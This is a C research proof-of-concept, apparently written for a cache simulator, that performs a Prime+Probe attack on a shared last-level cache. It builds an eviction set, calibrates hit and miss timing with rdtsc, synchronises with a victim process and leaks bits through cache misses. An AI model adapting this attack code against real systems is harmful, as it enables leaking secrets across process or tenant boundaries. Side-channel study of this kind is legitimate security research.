/*
 * Copyright (c) 2006 The Regents of The University of Michigan
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met: redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer;
 * redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution;
 * neither the name of the copyright holders nor the names of its
 * contributors may be used to endorse or promote products derived from
 * this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>




uint64_t rdtsc() 
{
    uint64_t a ;
    uint64_t d ;
    int ar ;
    int dr ;
    __asm__ volatile ("mfence");
    __asm__ volatile ("rdtsc" : "=a" (ar), "=d" (dr) );
 

    a= ar;
    d= dr;
    a = (d << 32) | (a);
    __asm__ volatile ("mfence");

    return (a);
}

void maccess(int* p)
{
  __asm__ volatile ("mov  %%ebx, %0\n"
    :
    : "m" (p)
       );
}

//void maccess(int* p) 
// {
//   volatile int q;
//   q=*p;
// }

void wait_on_rdtsc(uint64_t start, uint64_t wait_time) {
int flag=0;
uint64_t time, end;
    //wait
    while (!flag){
	    end = rdtsc();
	    if(end <start) { //rollover 
		time = end +  ~(start);
	    } else {
		time = end -start;
	    }
	    if(time >= wait_time){
		    flag=1;
	    }
    }
}





#define ASSOCIATIVITY_LLC 16
#define N_LLC 8
#define BLOCK_SIZE 64
#define LLC_SIZE 1024*1024 //1MB
#define EVICTION_SET_SIZE  ASSOCIATIVITY_LLC +4			   
			   
int log2_int ( int val){

	int count=0;
	while(val!=0) {
		val= val/2;
		count = count+1;
	}

	return (count-1);
}
void calculate_llc_set_and_cache_number(int addr, int* llc_set, int* cache_number){

	int block_offset = log2_int(BLOCK_SIZE);
	int cache_number_offset = log2_int(N_LLC);
	int num_sets = LLC_SIZE /(BLOCK_SIZE* ASSOCIATIVITY_LLC);
	int set_bits = log2_int(num_sets);

	int set_mask= (num_sets -1) << (cache_number_offset +block_offset);
	int cache_number_mask = (N_LLC-1)<<(block_offset);

	//printf("EXE_LOG:: block_offset=%0d, cache_number_offset=%0d, num_sets=%0d, set_bits=%0d, set_mask=%0x, cache_number_mask=%0x \n",block_offset, cache_number_offset, num_sets, set_bits, set_mask, cache_number_mask); 
	*llc_set = (addr & set_mask) >> (cache_number_offset +block_offset);
	*cache_number= (addr& cache_number_mask) >> (block_offset);
}

void create_eviction_set( int m_array, int victim_set, int victim_cache_number,volatile int** eviction_set) {
	int first_address=0;
	int hit=0;
	int count=0;
	int cache_number;
	int cache_set;
	int addr;

	while(!hit) {
		addr = m_array +count*BLOCK_SIZE;
		calculate_llc_set_and_cache_number(addr, &cache_set, &cache_number);
		//printf("EXE_LOG:: addr =%0x cache_set=%0x cache_number=%0d victim_set=%0x victim_cache_number=%0d\n", addr, cache_set, cache_number, victim_set, victim_cache_number);
		if((victim_cache_number==cache_number)&& (victim_set==cache_set)) {
			hit=1;
		}
		count++;
	}
	first_address = addr;
	printf("EXE_LOG:: first address =%0x\n", first_address);
	for( int i=0; i< EVICTION_SET_SIZE ; i=i+1) {
		eviction_set[i] = first_address;
		first_address = first_address + ((LLC_SIZE)*(N_LLC))/ASSOCIATIVITY_LLC;
	}
		   	

}

int determine_miss_threshold(volatile int** eviction_set) {
	int latency;
	int latency_hit;
	int latency_miss;
	
	int latency_avg;
	int latency_threshold;
	volatile int* checkpoint = (int*)0xB0001c0;
	int val;
	uint64_t start, end;

	__asm__ volatile ("mfence");
	val = *checkpoint;
	__asm__ volatile ("mfence");

	printf("EXE_LOG:: ========================================================================================================\n");
	printf("EXE_LOG:: ==========================================Priming the cache=============================================\n");
	printf("EXE_LOG:: ========================================================================================================\n");
	//Prime the eviction set 
	for(int i=0; i<100; i=i+1) {
		for( int j=ASSOCIATIVITY_LLC-1; j>=0 ; j=j-1){
			*(eviction_set[j]) = j;
		}
	}
	printf("EXE_LOG:: ========================================================================================================\n");
	printf("EXE_LOG:: ==========================================Priming the cache=============================================\n");
	printf("EXE_LOG:: ========================================================================================================\n");
	//__asm__ volatile ("mfence");
	//val = *checkpoint;
	//__asm__ volatile ("mfence");

	printf("EXE_LOG:: ========================================================================================================\n");
	printf("EXE_LOG:: ==========================================Probing the cache=============================================\n");
	printf("EXE_LOG:: ========================================================================================================\n");
	
	//Probe the eviction set
	latency_avg=0;
	
	//warm up the cache line for val
	val=rdtsc();
	start=end;
	for( int i=0; i< ASSOCIATIVITY_LLC; i=i+1){
		__asm__ volatile ("mfence");
		val=*checkpoint;		
		__asm__ volatile ("mfence");
		start= rdtsc();
		val= *(eviction_set[i]);
		end= rdtsc();
		__asm__ volatile ("mfence");
		val=*checkpoint;
		__asm__ volatile ("mfence");

		latency= end-start;
		printf("EXE_LOG:: i=%0d  latency=%0d val=%0d\n", i, latency, val);
		
		if(i!=0) {
			latency_avg = (latency_avg*(i-1) + latency)/(i);
		}
	}
	latency_hit = latency_avg;

	latency_avg=0;
	for( int i=ASSOCIATIVITY_LLC; i< EVICTION_SET_SIZE ; i=i+1){
		__asm__ volatile ("mfence");
		val= *checkpoint;
		__asm__ volatile ("mfence");
		start= rdtsc();
		val= *(eviction_set[i]);
		end= rdtsc();
		__asm__ volatile ("mfence");
		val= *checkpoint;
		__asm__ volatile ("mfence");

		latency= end-start;
		printf("EXE_LOG:: i=%0d  latency=%0d val=%0d\n", i, latency, val);
		
		latency_avg = (latency_avg*(i -ASSOCIATIVITY_LLC) + latency)/((i-ASSOCIATIVITY_LLC)+1);
	}
	latency_miss = latency_avg;

	
	printf("EXE_LOG:: ========================================================================================================\n");
	printf("EXE_LOG:: ==========================================Probing the cache=============================================\n");
	printf("EXE_LOG:: ========================================================================================================\n");
	latency_threshold = (latency_miss + 3*latency_hit)/4; //Keep the threshold closer to the latency hit
	printf("EXE_LOG:: latency_miss =%0d, latency_hit=%0d, latency_threshold=%0d\n", latency_miss, latency_hit, latency_threshold);
	return latency_threshold;
}

void wait(int n) {
	for( int i=0; i< n; i++);
}
int main(int argc, char* argv[])
{
    int  array_start = 0xa000000;
    int victim_address = 0x6000;
    int victim_set ;
    int victim_cache_number;
    int miss_threshold;
    volatile int *eviction_set[EVICTION_SET_SIZE];
    int* sync_point_v2a = (int*) 0x5000;
    int* sync_point_a2v = (int*) 0x5004;
    volatile int* checkpoint  = (int*) 0xB0001c0;

    *sync_point_a2v=0;

    calculate_llc_set_and_cache_number( sync_point_v2a, &victim_set, &victim_cache_number);
    printf("EXE_LOG:: sync_point_v2a =%0x,  LLC Set =%0x, Cache Number = %0d\n", sync_point_v2a, victim_set, victim_cache_number);

    calculate_llc_set_and_cache_number( sync_point_a2v, &victim_set, &victim_cache_number);
    printf("EXE_LOG:: sync_point_a2v =%0x,  LLC Set =%0x, Cache Number = %0d\n", sync_point_a2v, victim_set, victim_cache_number);

    calculate_llc_set_and_cache_number( checkpoint, &victim_set, &victim_cache_number);
    printf("EXE_LOG:: checkpoint =%0x,  LLC Set =%0x, Cache Number = %0d\n", checkpoint, victim_set, victim_cache_number);


    calculate_llc_set_and_cache_number( victim_address, &victim_set, &victim_cache_number);
    printf("EXE_LOG:: Victim Address =%0x, Victim LLC Set =%0x, Victim Cache Number = %0d\n", victim_address, victim_set, victim_cache_number);

    printf("EXE_LOG:: Before Eviction Set Create\n");
    create_eviction_set(array_start, victim_set, victim_cache_number, eviction_set);
    printf("EXE_LOG:: After Eviction Set Create\n");

    for(int  i=0; i<EVICTION_SET_SIZE; i++) {
	    int cache_number, cache_set;

	    calculate_llc_set_and_cache_number( eviction_set[i], &cache_set, &cache_number);

	    printf("EXE_LOG:: Eviction Set:: Address[%0d]= %0x, Cache_set=%0x, Cache_number=%0d\n",i, eviction_set[i], cache_set, cache_number);
    }

    miss_threshold = determine_miss_threshold(eviction_set);
    

    //Attack
    //Barrier
    *sync_point_a2v=1;
    while(*sync_point_v2a==0) {;}
    *sync_point_a2v=0;    
    
    printf("EXE_LOG:: Attacker:: Past the sync_point\n");
   
    volatile int val;
    uint64_t start, end;
    int latency;
    int latency_avg=0;
    int result=0;
    for( int iter=0; iter<5; iter++) {
    //prime

    	for(int i=0; i<100; i=i+1) {
    	    for( int j=ASSOCIATIVITY_LLC-1; j>=0 ; j=j-1){
    	    	*(eviction_set[j]) = j;
    	    }
    	}

	//__asm__ volatile ("mfence");
	//val= *checkpoint;
	//__asm__ volatile ("mfence");

	//Flag the victim to access
	*sync_point_a2v=1; 
	wait(100);

	//Wait for victim activity
	while(*sync_point_v2a==0) {;}
	*sync_point_v2a=0;
	
	printf("EXE_LOG:: ========================================================================================================\n");
	printf("EXE_LOG:: ==========================================Probing the cache=============================================\n");
	printf("EXE_LOG:: ========================================================================================================\n");


	//Probe
	int L2_Miss=0;
	//warm up the cache line for val
	val=rdtsc();
	start=end;
	printf("EXE_LOG:: Addr of Start=%0x, End=%0x\n", &start, &end);
    	for( int j=0; j< ASSOCIATIVITY_LLC; j=j+1){
	    __asm__ volatile ("mfence");
	    val= *checkpoint;
    	    __asm__ volatile ("mfence");
	    start= rdtsc();	
    	    val= *(eviction_set[j]) ;
	    end= rdtsc();
	     __asm__ volatile ("mfence");
	     val= *checkpoint;
	     __asm__ volatile ("mfence");
	    latency= end-start;
	    printf("EXE_LOG:: Attacker:: j=%0d, latency=%0d\n", j, latency); 
	    if(j!=0){
	    	if(latency> miss_threshold){
	    		 L2_Miss=1;
			 latency_avg = latency;
		}
	    }

    	}
        printf("EXE_LOG:: Attacker:: iter=%0d, latency=%0d\n",iter,  latency_avg);
    	if(L2_Miss==1){
		result = result | (1<<iter);
	}
	printf("EXE_LOG:: ========================================================================================================\n");
	printf("EXE_LOG:: ==========================================Probing the cache=============================================\n");
	printf("EXE_LOG:: ========================================================================================================\n");



   }


   printf("EXE_LOG:: Attacker:: Result through side Channel=%0x\n", result);

    





    return 0;
}

